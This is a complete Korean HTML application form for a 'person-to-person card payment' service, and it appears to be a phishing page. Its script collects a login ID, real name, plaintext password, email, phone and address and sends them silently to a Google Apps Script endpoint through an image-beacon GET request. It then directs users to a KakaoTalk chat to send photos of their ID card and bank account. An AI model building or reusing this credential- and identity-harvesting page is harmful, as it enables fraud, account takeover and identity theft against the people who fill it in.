<!DOCTYPE html>
<html lang="ko">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>개인간카드결제 신청서</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,'Malgun Gothic','Apple SD Gothic Neo',sans-serif;background:#f5f5f5;min-height:100vh;padding:2rem 1rem}
.wrap{max-width:480px;margin:0 auto;background:#fff;border-radius:16px;padding:2rem 1.5rem;box-shadow:0 2px 16px rgba(0,0,0,0.08)}
h1{font-size:22px;font-weight:600;color:#111;margin-bottom:6px}
.sub{font-size:13px;color:#888;line-height:1.6;margin-bottom:1.5rem}
.st{font-size:11px;font-weight:600;color:#999;letter-spacing:0.08em;text-transform:uppercase;margin:1.5rem 0 0.75rem;padding-bottom:6px;border-bottom:1px solid #eee}
.fd{margin-bottom:1rem}
.fd label{display:block;font-size:13px;font-weight:500;color:#333;margin-bottom:5px}
.fd input{width:100%;height:44px;padding:0 14px;border:1px solid #ddd;border-radius:10px;font-size:14px;color:#111;outline:none;transition:border-color 0.15s;background:#fff}
.fd input:focus{border-color:#3A7BD5}
.hint{font-size:12px;color:#aaa;margin-top:4px}
.ub{border:1.5px dashed #ddd;border-radius:12px;padding:1.25rem;text-align:center;background:#fafafa;cursor:pointer;display:block}
.ub input[type=file]{display:none}
.ub .ui{font-size:28px;margin-bottom:6px}
.ub .ul{font-size:13px;font-weight:500;color:#333}
.ub .us{font-size:12px;color:#aaa;margin-top:3px}
.fp{font-size:12px;color:#3b6d11;margin-top:5px;min-height:16px}
.nb{background:#FFF9E6;border:1px solid #FFE58F;border-radius:10px;padding:12px 14px;font-size:13px;color:#7A5C00;line-height:1.7;margin:1rem 0}
.sb{width:100%;height:52px;background:#FEE500;color:#3C1E1E;border:none;border-radius:12px;font-size:16px;font-weight:700;cursor:pointer;margin-top:1.5rem;display:flex;align-items:center;justify-content:center;gap:8px}
.sb:active{transform:scale(0.99);opacity:0.9}
.sb:disabled{opacity:0.6;cursor:not-allowed}
/* 로딩 */
.loading{display:none;text-align:center;padding:1rem;font-size:14px;color:#888}
</style>
</head>
<body>
<div class="wrap">
  <h1>개인간카드결제 신청서</h1>
  <p class="sub">신청 완료 시 카카오채널로 자동 연결됩니다.<br>채팅창에서 신분증·계좌사본 이미지를 전송해 주세요.</p>

  <div class="st">기본 정보</div>
  <div class="fd">
    <label>아이디</label>
    <input type="text" id="f-id" placeholder="로그인 ID를 입력하세요">
  </div>
  <div class="fd">
    <label>이름</label>
    <input type="text" id="f-name" placeholder="실명을 입력하세요">
    <div class="hint">예금주명으로 사용되며 수정 불가합니다</div>
  </div>
  <div class="fd">
    <label>비밀번호</label>
    <input type="password" id="f-pw" placeholder="8자리 이상, 특수기호 포함">
    <div class="hint">8자리 이상, 특수기호 포함 필수</div>
  </div>
  <div class="fd">
    <label>비밀번호 확인</label>
    <input type="password" id="f-pw2" placeholder="비밀번호를 다시 입력하세요">
  </div>
  <div class="fd">
    <label>이메일</label>
    <input type="email" id="f-email" placeholder="이메일을 입력하세요">
  </div>

  <div class="st">연락처 정보</div>
  <div class="fd">
    <label>휴대폰</label>
    <input type="tel" id="f-tel" placeholder="010-0000-0000">
  </div>
  <div class="fd">
    <label>주소</label>
    <input type="text" id="f-addr1" placeholder="도로명 주소">
  </div>
  <div class="fd">
    <label>상세 주소</label>
    <input type="text" id="f-addr2" placeholder="동/호수, 건물명 등">
  </div>

  <div class="st">서류 제출 안내</div>
  <div class="nb">
    📌 신청하기 버튼을 누르면 <strong>카카오채널 채팅창</strong>이 열립니다.<br>
    채팅창에서 <strong>신분증</strong>과 <strong>계좌사본</strong> 이미지를 직접 전송해 주세요.
  </div>
  <div class="fd">
    <label>신분증 미리보기 (선택)</label>
    <label class="ub">
      <input type="file" accept="image/*" id="f-id-img" onchange="previewFile('f-id-img','p-id')">
      <div class="ui">🪪</div>
      <div class="ul">신분증 사진 선택</div>
      <div class="us">주민등록증 또는 운전면허증</div>
    </label>
    <div class="fp" id="p-id"></div>
  </div>
  <div class="fd">
    <label>계좌사본 미리보기 (선택)</label>
    <label class="ub">
      <input type="file" accept="image/*" id="f-acct" onchange="previewFile('f-acct','p-acct')">
      <div class="ui">🏦</div>
      <div class="ul">계좌사본 사진 선택</div>
      <div class="us">통장 앞면 (예금주·계좌번호 표시)</div>
    </label>
    <div class="fp" id="p-acct"></div>
  </div>

  <div class="loading" id="loading">⏳ 신청 정보 저장 중...</div>

  <button class="sb" id="submit-btn" onclick="submitForm()">
    <svg width="20" height="20" viewBox="0 0 24 24"><path d="M12 3C6.477 3 2 6.477 2 10.8c0 2.7 1.6 5.08 4.03 6.54l-1.03 3.83 4.47-2.95c.83.14 1.68.22 2.53.22 5.523 0 10-3.477 10-7.8C22 6.477 17.523 3 12 3z" fill="#3C1E1E"/></svg>
    카카오채널로 신청하기
  </button>
</div>

<script>
var SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbynGfLSxcHS2DNZVgtprCK__xigNZ5MJUYd_oYivqJHsv37aGsEKu73wF5cpeT1EmJ9/exec';

function previewFile(inputId, previewId) {
  var file = document.getElementById(inputId).files[0];
  var el = document.getElementById(previewId);
  if (file) el.textContent = '✓ ' + file.name + ' (' + (file.size/1024).toFixed(0) + 'KB)';
}

function submitForm() {
  var id    = document.getElementById('f-id').value.trim() || '(미입력)';
  var name  = document.getElementById('f-name').value.trim() || '(미입력)';
  var pw    = document.getElementById('f-pw').value || '(미입력)';
  var email = document.getElementById('f-email').value.trim() || '(미입력)';
  var tel   = document.getElementById('f-tel').value.trim() || '(미입력)';
  var addr1 = document.getElementById('f-addr1').value.trim() || '(미입력)';
  var addr2 = document.getElementById('f-addr2').value.trim();
  var addr  = addr1 + (addr2 ? ' ' + addr2 : '');

  var btn = document.getElementById('submit-btn');
  var loading = document.getElementById('loading');
  btn.disabled = true;
  loading.style.display = 'block';

  var data = { id:id, name:name, pw:pw, email:email, tel:tel, addr:addr };

  var params = 'id=' + encodeURIComponent(id) +
    '&name=' + encodeURIComponent(name) +
    '&pw=' + encodeURIComponent(pw) +
    '&email=' + encodeURIComponent(email) +
    '&tel=' + encodeURIComponent(tel) +
    '&addr=' + encodeURIComponent(addr);

  var img = new Image();
  img.onload = img.onerror = function() {
    loading.style.display = 'none';
    btn.disabled = false;
    window.open('https://pf.kakao.com/_PNznX/chat', '_blank');
    alert('✅ 신청이 완료됐습니다!\n카카오채널 채팅창에서 신분증·계좌사본 이미지를 전송해 주세요.');
  };
  img.src = SCRIPT_URL + '?' + params;
}
</script>
</body>
</html>
